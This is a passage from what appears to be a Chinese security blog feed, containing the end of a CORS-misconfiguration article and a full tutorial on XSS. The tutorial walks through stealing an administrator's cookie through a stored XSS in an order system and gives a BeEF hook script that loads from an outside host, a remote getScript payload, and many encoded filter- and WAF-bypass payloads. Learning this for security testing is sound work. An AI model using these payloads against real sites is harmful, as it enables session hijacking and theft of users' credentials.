Proxy 模块下的 HTTP history 来筛选带有 CORS 头部的值：</p><p><img src="/images/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/1646820729340-d1b5d3f7-608b-4b9c-9601-e143470bb344.png" alt="img" /></p><p>条件可以是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: foo.example.org</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure><p>这里要注意的是，我们也可以测试下带有 CORS 字段的网站是否有 CORS 漏洞，如果服务器响应包的请求头是以下几种情况则可存在 CORS 漏洞</p><ol><li><p>一定有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">或</span><br><span class="line">Access-Control-Allow-Origin: https://attacker.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure></li><li><p>可能：（同时出现）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: null</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure></li><li><p>没有：(浏览器会自动截至)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure></li></ol><p>有时候 CORS 配置了信任自身的任意子域，那么如果一个子域存在 XSS 漏洞就可以通过这个漏洞去读取其他子域的资源，类似的场景还有比如 HTTPS 域信任 HTTP 域等。</p><h2 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具</h2><ol><li><a href="https://github.com/chenjj/CORScanner%E3%80%82">https://github.com/chenjj/CORScanner。</a></li><li>详细说明+payload <a href="https://github.com/AI0TSec/blog/issues/9">https://github.com/AI0TSec/blog/issues/9</a></li></ol><h2 id="防护-2"><a class="markdownIt-Anchor" href="#防护-2"></a> 防护</h2><ol><li>关闭不必要开启的CORS；</li><li>白名单限制：定义“源”的白名单，避免使用正则表达式，不要配置 Access-Control-Allow-Origin 为通配符 * 或 null ，严格效验来自请求数据包中的 Origin 的值；</li><li>仅允许使用安全协议，避免中间人攻击；</li><li>尽可能的返回 Vary: Origin 头部，以避免攻击者利用浏览器缓存进行攻击；</li><li>避免将 Access-Control-Allow-Credentials 标头设置为默认值 true ，跨域请求若不存在必要的凭证数据，则根据实际情况将其设置为 false；</li><li>限制跨域请求允许的方法，Access-Control-Allow-Methods 最大限度地减少所涉及的方法，降低风险；</li><li>限制浏览器缓存期限：建议通过 Access-Control-Allow-Methods 和 Access-Control-Allow-Headers 头部，限制浏览器缓存信息的时间。通过配置 Access-Control-Max-Age 标头来完成，该头部接收时间数作为输入，该数字是浏览器保存缓存的时间。配置相对较低的值，确保浏览器在短时间内可以更新策略；</li><li>仅在接收到跨域请求时才配置有关于跨域的头部，并确保跨域请求是合法的源，以减少攻击者恶意利用的可能性。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;认证-授权与凭证的概念&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#认证-授权与凭证的概念&quot;&gt;&lt;/a&gt; 认证、授权与凭证的概念&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;认证&lt;/strong&gt;：&lt;strong&gt;验证当前用户的身份&lt;/strong</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="XSS" scheme="https://j3f5.github.io/tags/XSS/"/>
    
    <category term="CSRF" scheme="https://j3f5.github.io/tags/CSRF/"/>
    
    <category term="劫持" scheme="https://j3f5.github.io/tags/%E5%8A%AB%E6%8C%81/"/>
    
    <category term="跨域" scheme="https://j3f5.github.io/tags/%E8%B7%A8%E5%9F%9F/"/>
    
  </entry>
  
  <entry>
    <title>XSS跨站基础</title>
    <link href="https://j3f5.github.io/articles/2023/05/30/XSS%E8%B7%A8%E7%AB%99%E5%9F%BA%E7%A1%80/"/>
    <id>https://j3f5.github.io/articles/2023/05/30/XSS%E8%B7%A8%E7%AB%99%E5%9F%BA%E7%A1%80/</id>
    <published>2023-05-30T08:40:42.000Z</published>
    <updated>2023-06-01T03:09:45.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss跨站基础"><a class="markdownIt-Anchor" href="#xss跨站基础"></a> XSS跨站基础</h1><h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2><p>恶意攻击者在web页面中会插入一些恶意的javascript代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。</p><p><strong>层面</strong>：一般都是在前端，<strong>JavaScript代码能干什么，执行之后就会达到相应的效果</strong></p><p><strong>函数</strong>：比如说php中的脚本的输出函数：常见的输出函数有：<strong>print、print_r、echo、printf、sprintf、die、var_dump、var_export</strong></p><img src="/images/XSS%E8%B7%A8%E7%AB%99%E5%9F%BA%E7%A1%80/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBASXNlY05vb2I=,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述" style="zoom:80%;" /><h2 id="危害影响"><a class="markdownIt-Anchor" href="#危害影响"></a> 危害影响</h2><p>攻击者通过Web应用程序发送恶意代码，一般以浏览器脚本的形式发送给不同的终端用户。当一个Web程序的用户输入点没有进行校验和编码，将很容易的导致XSS。</p><ul><li>网络钓鱼，包括获取各类用户账号；</li><li>窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作；</li><li>劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、强制发表日志、电子邮件等；</li><li>强制弹出广告页面、刷流量等；</li><li>网页挂马；</li><li>进行恶意操作，如任意篡改页面信息、删除文章等；</li><li>进行大量的客户端攻击，如ddos等；</li><li>获取客户端信息，如用户的浏览历史、真实ip、开放端口等；</li><li>控制受害者机器向其他网站发起攻击；</li><li>结合其他漏洞，如csrf,实施进一步危害；</li><li>提升用户权限，包括进一步渗透网站；</li><li>传播跨站脚本蠕虫等</li></ul><p>注意：浏览器的内核会影响攻击的产生（会阻止），所以，XSS的危害会受到很多因素的影响。</p><p>攻击成功的条件：<strong>对方有漏洞，浏览器存有cookie，浏览器不进行拦截，不存在带代码过滤和httponly，对方要触发这个漏洞地址</strong></p><h2 id="出现位置"><a class="markdownIt-Anchor" href="#出现位置"></a> 出现位置</h2><p>文章发表、评论、留言、注册资料、修改资料等地方</p><h3 id="什么位置是有用的"><a class="markdownIt-Anchor" href="#什么位置是有用的"></a> 什么位置是有用的？</h3><p>一般XSS漏洞，厂家是不收的，因为有很多的限制条件，但是我们如果在订单发布等地方发现了XSS存储型漏洞，那么这个漏洞是很有价值的。因为管理员会经常访问订单页面查看，不需要我们去发链接给他触发。</p><p>重点位置：</p><ul><li>留言板</li><li>评论区</li><li>订单系统</li><li>反馈信息</li></ul><h3 id="测试手法"><a class="markdownIt-Anchor" href="#测试手法"></a> 测试手法</h3><p>盲打，直接冲，乱甩payload。注意，这个位置必须是上面的位置！</p><h2 id="攻击类型分类"><a class="markdownIt-Anchor" href="#攻击类型分类"></a> 攻击类型分类</h2><p>反射型：发包 =&gt; x.php =&gt; 回包</p><p>存储型：发包 =&gt; x.php =&gt; 数据库 =&gt; 回包</p><p>DOM型：发包 =&gt; 本地浏览器静态前端代码 =&gt; x.php</p><h3 id="反射型"><a class="markdownIt-Anchor" href="#反射型"></a> 反射型</h3><p>反射性xss一般指攻击者通过特定的方式来诱惑受害者去访问一个包含恶意代码的URL。当<strong>受害者点击恶意链接url</strong>的时候，恶意代码会直接在受害者的主机上的浏览器执行。是需要点击才能攻击。</p><p>场景：攻击者发送一个带有恶意连接的邮件给受害者，受害者点击。</p><h3 id="存储型"><a class="markdownIt-Anchor" href="#存储型"></a> 存储型</h3><p>存储型XSS时常伴随着SQL注入。它的特征是，XSS攻击Payload是被写到数据库里面了。是持续性的攻击。</p><p>场景：受害者<strong>正常</strong>访问网页，网页会执行XSS脚本。</p><h3 id="dom型"><a class="markdownIt-Anchor" href="#dom型"></a> DOM型</h3><img src="/images/XSS%E8%B7%A8%E7%AB%99%E5%9F%BA%E7%A1%80/30e9170e4e954d3c8846f24c8f8f14be.gif" alt="在这里插入图片描述" style="zoom: 80%;" /><blockquote><p>在翻页的时候，有两种：一种是点击第二页，然后跳转，另一种是点击展示更多，然后加载。前者是与PHP等后端语言打交道，然后生成页面。后者是与HTML打交道，然后重新构造DOM（插入），生成更多的视图。</p><p><strong>而JS可以操作HTML DOM结点！</strong></p></blockquote><p>官方解释：</p><blockquote><p>基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。</p></blockquote><p>用户请求一个经过专门设计的URL，它由攻击者提供，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。</p><p>如下面的HTML文件就存在DOM型XSS，其功能是当我们在URL栏输入参数name的值后，就会在当前页面显示输入如的name的值，其功能的实现全都在前端JS中进行、未与后台进行任何交互：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> pos=<span class="variable language_">document</span>.<span class="property">URL</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;name=&quot;</span>)+<span class="number">5</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="built_in">decodeURI</span>(<span class="variable language_">document</span>.<span class="property">URL</span>.<span class="title function_">substring</span>(pos,<span class="variable language_">document</span>.<span class="property">URL</span>.<span class="property">length</span>)));</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>从代码层面看，漏洞形成原因很简单，<code>document.URL</code>获取用户输入，在代码中未经过任何过滤就传递给了<code>document.write</code>输出到当前页面中。</p><p>当我们正常输入name值时页面直接显示输入的内容，F12查看DOM文档可看到输入的内容确实是插入到当前DOM结构中：</p><img src="/images/XSS%E8%B7%A8%E7%AB%99%E5%9F%BA%E7%A1%80/image-20230531091945658.png" alt="image-20230531091945658" style="zoom:67%;" /><p>也就是说DOM结构我们用户输入可控，当我们输入XSS payload时就会弹框，造成DOM型XSS。</p><p>从挖洞角度看，任何漏洞都是从外部输入加上危险的操作导致的，这里DOM型XSS也不例外。</p><p>DOM型XSS中，其外部输入是<strong>JS中存在获取外部输入内容的可利用的代码</strong>如URL栏内容的location.href，然后该<strong>外部输入内容在未经过有效过滤</strong>的情况下就<strong>传入危险的输出函数直接输出到页面中或传入eval等危险执行函数</strong>就会在页面上<strong>直接解析恶意JS代码</strong>，导致DOM型XSS的存在。</p><p>参考链接：<a href="https://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/">https://www.mi1k7ea.com/2019/06/25/浅析DOM型XSS/</a></p><p>下面列下外部输入Sources和危险敏感操作Sinks（包括执行/输出页面），而对于DOM型XSS漏洞挖掘来说，可以简单归纳为在客户端加载的JS代码中，存在Sources+Sinks的情况即有可能存在DOM型XSS。具体见附录。</p><h1 id="实际攻击示例"><a class="markdownIt-Anchor" href="#实际攻击示例"></a> 实际攻击示例</h1><ol><li><p>发现订单页面：</p><img src="/images/XSS%E8%B7%A8%E7%AB%99%E5%9F%BA%E7%A1%80/image-20230531143402003.png" alt="image-20230531143402003" style="zoom:50%;" /><ol start="2"><li><p>登录XSS平台，复制他给的PAYLOAD</p><img src="/images/XSS%E8%B7%A8%E7%AB%99%E5%9F%BA%E7%A1%80/image-20230531143452092.png" alt="image-20230531143452092" style="zoom:50%;" /></li><li><p>注入之后，等到管理员打开订单系统查看信息，那么就会出发漏洞，我们可以从XSS平台上获得相关信息，例如cookie</p><img src="/images/XSS%E8%B7%A8%E7%AB%99%E5%9F%BA%E7%A1%80/image-20230531143603565.png" alt="image-20230531143603565" style="zoom:50%;" /></li><li><p>获得COOKIE后使用Postman构造包，模拟发送接收，重现登录到后台系统的操作。</p></li></ol><p>注：也可以自己写代码接收数据。自己构建XSS平台。</p></li></ol><h1 id="手法"><a class="markdownIt-Anchor" href="#手法"></a> 手法</h1><h2 id="xss平台的使用"><a class="markdownIt-Anchor" href="#xss平台的使用"></a> XSS平台的使用</h2><p>平台有很多，直接上网搜“XSS”平台即可。还有著名的Beef平台。</p><blockquote><ol><li><a href="http://xssaq.com">xssaq.com</a></li></ol></blockquote><p>上面说过简单的利用。大致都是复制平台上的Payload，放到可能有xss注入的地方。然后再平台上进行相关操作。</p><h2 id="xss工具的使用"><a class="markdownIt-Anchor" href="#xss工具的使用"></a> XSS工具的使用</h2><p><strong>beef-xss</strong>，就是复制他给的攻击Payload，直接冲就完事了。然后他通过hook.js实现对网站的攻击。可以实现跳转啊之类的。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://IP:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ol><li>IP地址扫描</li><li>结合JBoss攻击…</li></ol><p>实际上他是 <strong>禁止加载外域的代码</strong>。</p><h2 id="xss结合其他漏洞"><a class="markdownIt-Anchor" href="#xss结合其他漏洞"></a> XSS结合其他漏洞</h2><h1 id="绕过"><a class="markdownIt-Anchor" href="#绕过"></a> 绕过</h1><h2 id="代码过滤"><a class="markdownIt-Anchor" href="#代码过滤"></a> 代码过滤</h2><h3 id="测试是否存在过滤"><a class="markdownIt-Anchor" href="#测试是否存在过滤"></a> 测试是否存在过滤</h3><ol><li>输入<code>asdf&lt;'&quot;=&gt;asdf</code> 这个有没有被过滤。如果看源码这个都没有转码成<code>&amp;gt;&amp;lt;</code>啥的，就很可能存在XSS漏洞。</li><li>因为存在<code>&lt;&gt;</code>与单引号这一类字符，所以HTML不正确，会一直呆在那个页面，而如果正确，则会到成功页面。那时候我们基于这个网址构造的payload就没用了。所以在调试的时候必须让这个页面处于原页面，不让他转。</li><li>如果过滤了<code>&lt;&gt;</code>和<code>&quot;</code>，那么可以使用<code>onFocus=‘</code>来完成攻击。</li></ol><p>常用的攻击和测试函数：</p><ol><li><code>alert</code></li><li><code>eval</code></li><li><code>fromCharCode</code></li><li><code>onChange</code></li><li><code>onFocus</code></li><li><code>&lt;.\*?&gt;</code></li></ol><h3 id="代码绕过"><a class="markdownIt-Anchor" href="#代码绕过"></a> 代码绕过</h3><ol><li><p>双写绕过、大小写绕过</p></li><li><p>伪协议绕过：<code>javascript:alert(1);</code>。注：<strong>Javascript:伪协议后面可以使用URL编码。</strong></p><p><code>&lt;IMG SRC=&quot;javascript:alert('XSS');&quot;&gt;</code></p><p><code>&lt;IMG SRC=javascript:alert('XSS')&gt;</code></p></li><li><p>利用标签属性：</p><ol><li><code>script</code>：<code>&lt;script&gt;alert('1')&lt;/script&gt;</code></li><li><code>&lt;a href=&gt;</code>：<code>&quot;&gt; &lt;a href=javascript:alert(1)&gt;xss&lt;/a&gt;</code>（新造一个标签，可以大小写绕过）</li><li><code>&lt;img&gt;</code>：<code>&lt;img src=11 onerror=alert(1)&gt;</code></li></ol></li><li><p>利用事件：</p><ol><li><code>onclick</code>：<code>onclick=alert(1)</code></li><li><code>onfocus</code>：<code>onfocus=javascript:alert(1)</code></li><li><code>onerror</code>：<code>onerror=alert(1)</code>。onerror里的内容是当js解析的,因此可以用JSunicode编码,但是不能全部编码<strong>只能编码函数名</strong>。如果全部编码是会出错的。<strong>onerror支持：html10,html16，jsunicode,不支持js8进制和js16进制</strong></li><li><code>onmouseover</code>：（表示当鼠标移动到该标签上时就会触发执行某项动作）。</li></ol></li><li><p>利用远程加载：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">$.getScript(&quot;http://raw.githubsercontent.com/GrayHatHacking/GHHv5/master/ch16/test.js&quot;, function()&#123; hack(); &#125;); //</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>利用编码：</p><ol><li><p>使用Unicode编码js代码（<a href="https://www.matools.com/code-convert-url">转码网站</a>）：</p><p>注意事项：只有在标签内的script代码才能编码，首先经过unicode编码，然后再去url编码那里，编码后才算完成！</p><p><code>&lt;a href=javascript:\u0061\u006C\u0065\u0072\u0074(1)&gt;Click&lt;/a&gt;</code></p></li><li><p>URL编码</p><p><code>&lt;a href=javascript:%2561%256c%2565%2572%2574%2528%2531%2529&gt;Click&lt;/a&gt;</code></p></li><li><p>HTML实体编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">空格  &amp;nbsp;            &amp;#160;    &amp;#x20;</span><br><span class="line">&lt;    &amp;lt;              &amp;#60;      &amp;#x3c;</span><br><span class="line">&gt;    &amp;gt;              &amp;#62;      &amp;#x3e;</span><br><span class="line">&amp;    &amp;amp;             &amp;#38;      &amp;#x26;</span><br><span class="line">&quot;    &amp;quot;            &amp;#34;      &amp;#x22;</span><br><span class="line">&#x27;    &amp;apos; (IE不支持)  &amp;#39;      &amp;#x27;</span><br></pre></td></tr></table></figure><p>第二个就是十进制实体编码，使用<code>&amp;开头</code>；</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>第三个就是十六进制实体编码，使用<code>&amp;#x</code>开头，后面的数字跟URL编码是一样的。</p><p>需要注意的是，他需要<code>;</code>才能工作。例如<code>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</code></p><p><strong>以上三种编码是可以组合起来的</strong>：Unicode URL HTML</p></li><li><p>JavaScript编码</p><ol><li>三个八进制数字，如果不够个数，前面补0，例如“&lt;”编码为“\074”</li><li>两个十六进制数字，如果不够个数，前面补0，例如“&lt;”编码为“\x3c”</li><li>四个十六进制数字，如果不够个数，前面补0，例如“&lt;”编码为“\u003c”</li><li>对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）</li></ol><p>在javascript伪协议中可以用（<code>javascript</code>中只识别几种编码：Jsunicode js8进制 js16进制）。</p></li><li><p>base64编码</p><ol><li><p>在Data协议的时候使用</p></li><li><p>遇到如下标签：</p><ol><li><code>&lt;a href=&quot;可控&quot;&gt;</code></li><li><code>&lt;iframe src=&quot;可控&quot;&gt;</code></li><li><code>&lt;object data=“可控&quot;&gt;</code></li></ol><p>这个时候如果过滤了<code>&lt;&gt;'&quot;JavaScript</code>的话，则可以使用<code>&lt;img src=x οnerrοr=alert(1)&gt;</code>编码成：<code>PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==</code>，然后使用data协议代入可控点：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">“data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg</span>==<span class="string">”</span>&gt;</span>111<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol></li></ol></li><li><p>请求头注入：如referer和user-agent等等，都是可以利用的。只要它把这些值放到网页上，就可以利用！</p></li><li><p>字符绕过：</p><ol><li>空格：换行符<code>%0a</code>。<em><strong>换行时必须用单双引号围住，否则不会跳过。跳过回车和换行,不支持on事件</strong></em></li><li><code>/</code>：这个时候就不能用闭合标签了，可以使用非闭合的标签如<code>img</code>和<code>a</code></li></ol></li><li><p>引用外部资源，即src。</p></li></ol><h2 id="httponly禁止读cookie"><a class="markdownIt-Anchor" href="#httponly禁止读cookie"></a> HttpOnly禁止读Cookie</h2><p>httponly：如果给某个 cookie 设置了 httpOnly 属性，则无法通过 JS 脚本读取到该 cookie 的信息，但还可以在 Application 中手动修改 cookie，所以只是在一定程度上可以防止 XSS 攻击，不是绝对的安全。虽然设置了httponly之后拿不到cookie，但是还是存在xss跨站语句，阻止的仅仅是获取cookie。</p><p>下面是设置HTTP-only cookie的一个报头的示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: USER=123; expires=Wednesday, 09-Nov-99 23:12:40 GMT; HttpOnly</span><br></pre></td></tr></table></figure><p><strong>绕过</strong>：</p><ul><li>浏览器未保存帐号密码：需要 xss 产生登录地址（漏洞产生在登录界面），利用<strong>表单劫持</strong><ul><li>设置XSS平台的时候选择：获得对应输入框的明文账号密码，然后去看源码中输入框的type和name之类的参数，设置好就可以传这个XSSpayload进去。</li></ul></li><li>浏览器保存帐号密码：浏览器读取帐号密码</li></ul><h2 id="waf拦截与绕过"><a class="markdownIt-Anchor" href="#waf拦截与绕过"></a> WAF拦截与绕过</h2><ol><li>标签语法替换</li><li>提交方式更改，GET/POST</li><li>垃圾数据溢出</li><li>加密解密算法</li><li>结合其他漏洞绕过</li></ol><h1 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h1><h2 id="webshell盒子"><a class="markdownIt-Anchor" href="#webshell盒子"></a> WEBSHELL盒子</h2><p>有webshell中的webshell，当你利用他的大马传入到一个受害主机上，那么一旦你运行该马，那么这个马就会自动传受害者主机地址，利用的账号密码到他提前设置好的主机上。这样子，写这个马的人就 <strong>坐收渔翁之利</strong> ！</p><p>他一般会有一些代码，里面写了什么服务器信息啥的，可以仔细看看，但是他如果一旦混淆了，你就看不到了。</p><h3 id="如何探测这个是不是有后门"><a class="markdownIt-Anchor" href="#如何探测这个是不是有后门"></a> 如何探测这个是不是有后门？</h3><p>看一下有没有莫名其妙的数据包（用F12），抓包也行。在数据包有没有向外发送数据包，有个莫名其妙的你不懂的IP地址/URL</p><p>那么如何反杀？我们可以传一个存储型XSS进去，链上我们的XSS平台，进行黑吃黑吃黑！</p><h3 id="资源"><a class="markdownIt-Anchor" href="#资源"></a> 资源</h3><p><a href="http://xss.fbisb.com/">http://xss.fbisb.com/</a><br /><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a><br /><a href="https://www.postman.com/downloads/">https://www.postman.com/downloads/</a><br /><a href="https://pan.baidu.com/s/1lIUZvEVXs1du-Bmkt7-abA">https://pan.baidu.com/s/1lIUZvEVXs1du-Bmkt7-abA</a> 提取码：xiao<br /><a href="https://pan.baidu.com/s/13H4N1VTBVwd3t8YWpECBFw">https://pan.baidu.com/s/13H4N1VTBVwd3t8YWpECBFw</a> 提取码：xiao</p><h2 id="cookie与session对于xss的影响"><a class="markdownIt-Anchor" href="#cookie与session对于xss的影响"></a> Cookie与Session对于XSS的影响</h2><blockquote><p>小迪说：如果对方使用session验证，那么我们的xss平台是抓不到它的session的，<strong>因为session是存储在服务器的</strong>。</p></blockquote><p>**实战webgoat测试：**<a href="http://127.0.0.1:8080/WebGoat/start.mvc#lesson/CrossSiteScripting.lesson/6">http://127.0.0.1:8080/WebGoat/start.mvc#lesson/CrossSiteScripting.lesson/6</a></p><p>在传入我们的XSS平台代码时，是可以接收到他的JSESSION的！</p><img src="/images/XSS%E8%B7%A8%E7%AB%99%E5%9F%BA%E7%A1%80/image-20230531165200332.png" alt="image-20230531165200332" style="zoom:50%;" /><p>但是怎么利用呢？暂时不知道，经过BURP抓包发现他访问上面的网址会经过各种mvc，例如<code>WebGoat/service/lessonoverview.mvc </code>之类的，最终到达<code>/WebGoat/start.mvc</code>，<code>/WebGoat/service/lessonmenu.mvc</code>，…，lesson</p><h1 id="修复方案"><a class="markdownIt-Anchor" href="#修复方案"></a> 修复方案</h1><p>开启 httponly,输入过滤，输出过滤等</p><p>PHP:<a href="http://www.zuimoge.com/212.html">http://www.zuimoge.com/212.html</a></p><p>JAVA:<a href="https://www.cnblogs.com/baixiansheng/p/9001522.html">https://www.cnblogs.com/baixiansheng/p/9001522.html</a></p><ul><li>使用ESAPI，首先应当配置过滤器；其次将过滤器注册到web.xml文件中；最后配置Request的包装类</li></ul><h1 id="附录"><a class="markdownIt-Anchor" href="#附录"></a> 附录</h1><h2 id="资源-2"><a class="markdownIt-Anchor" href="#资源-2"></a> 资源</h2><p><a href="https://xss8.cc/xss.php?do=login">https://xss8.cc/xss.php?do=login</a><br /><a href="https://xsshs.cn/xss.php?do=login">https://xsshs.cn/xss.php?do=login</a><br /><a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a><br /><a href="http://down.chinaz.com/soft/37581.htm">http://down.chinaz.com/soft/37581.htm</a></p><p>工具：</p><p>自动化工具：<a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p><h2 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h2><ol><li>绕过：<a href="https://www.ddosi.org/xss-bypass/#%E7%BB%95%E8%BF%87WAF%E7%9A%84%E6%96%B9%E6%B3%95%E2%80%94%E2%80%94%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC">https://www.ddosi.org/xss-bypass/#绕过WAF的方法——跨站脚本</a></li><li>绕过：<a href="https://www.cnblogs.com/H4ck3R-XiX/p/12732356.html">https://www.cnblogs.com/H4ck3R-XiX/p/12732356.html</a></li></ol><h2 id="dom型xss漏洞挖掘trick函数"><a class="markdownIt-Anchor" href="#dom型xss漏洞挖掘trick函数"></a> DOM型XSS漏洞挖掘——trick函数</h2><h3 id="sources"><a class="markdownIt-Anchor" href="#sources"></a> Sources</h3><ul><li>document.URL</li><li>document.URLUnencoded</li><li>document.location（及其许多属性）</li><li>document.referrer</li><li>window.location（及其许多属性）</li><li>location</li><li>location.href</li><li>location.search</li><li>location.hash</li><li>location.pathname</li></ul><h3 id="sinks"><a class="markdownIt-Anchor" href="#sinks"></a> Sinks</h3><h4 id="直接执行脚本类"><a class="markdownIt-Anchor" href="#直接执行脚本类"></a> 直接执行脚本类</h4><ul><li>eval(…)</li><li>window.execScript(…)</li><li>window.setInterval(…)</li><li>window.setTimeout(…)</li></ul><h4 id="写html页面类"><a class="markdownIt-Anchor" href="#写html页面类"></a> 写HTML页面类</h4><ul><li>document.write(…)</li><li>document.writeln(…)</li><li>element.innerHTML(…)</li></ul><h4 id="直接修改dom类"><a class="markdownIt-Anchor" href="#直接修改dom类"></a> 直接修改DOM类</h4><ul><li>document.forms[0].action=… (and various other collections)</li><li>document.attachEvent(…)</li><li>document.create…(…)</li><li>document.execCommand(…)</li><li>document.body. … (accessing the DOM through the body object)</li><li>window.attachEvent(…)</li></ul><h4 id="替换文档url类"><a class="markdownIt-Anchor" href="#替换文档url类"></a> 替换文档URL类</h4><ul><li>document.location=… (and assigning to location’s href, host and hostname)</li><li>document.location.hostname=…</li><li>document.location.replace(…)</li><li>document.location.assign(…)</li><li>document.URL=…</li><li>window.navigate(…)</li></ul><h4 id="打开修改窗口类"><a class="markdownIt-Anchor" href="#打开修改窗口类"></a> 打开/修改窗口类</h4><ul><li>document.open(…)</li><li>window.open(…)</li><li>window.location.href=… (and assigning to location’s href, host and hostname)</li></ul>]]></content>
    
    
      
      
